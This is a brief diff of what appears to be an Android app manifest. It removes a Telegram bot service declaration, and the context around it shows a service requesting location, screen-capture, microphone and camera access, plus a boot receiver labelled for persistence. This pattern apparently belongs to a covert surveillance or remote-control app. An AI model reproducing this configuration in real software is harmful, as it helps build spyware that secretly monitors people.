@@ -74,12 +74,7 @@
             android:foregroundServiceType="dataSync|location|mediaProjection|microphone|camera"
             android:stopWithTask="false" />
 
-        <!-- Telegram Bot Service -->
-        <service
-            android:name=".admin.TelegramBotService"
-            android:enabled="true"
-            android:exported="false"
-            android:foregroundServiceType="dataSync" />
+        
 
         <!-- Boot Receiver for Persistence -->
         <receiver
